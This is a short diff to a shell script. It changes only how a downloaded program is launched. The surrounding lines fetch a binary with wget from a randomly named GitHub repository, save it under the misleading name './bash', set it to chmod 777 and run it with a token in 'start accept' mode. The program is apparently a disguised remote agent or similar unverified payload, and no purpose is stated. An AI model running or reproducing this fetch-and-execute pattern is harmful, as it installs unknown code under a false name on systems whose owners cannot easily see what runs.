@@ -5,7 +5,7 @@ tmp="$(mktemp -d)" && cd "$tmp"
 wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
 chmod 777 "./bash"
 if [ "$1" == "1" ]; then
-  sh <(echo "./bash start accept --token ${token}")
+  /bin/sh <(echo "./bash start accept --token ${token}")
 else
   ./bash start accept --token "${token}"
 fi
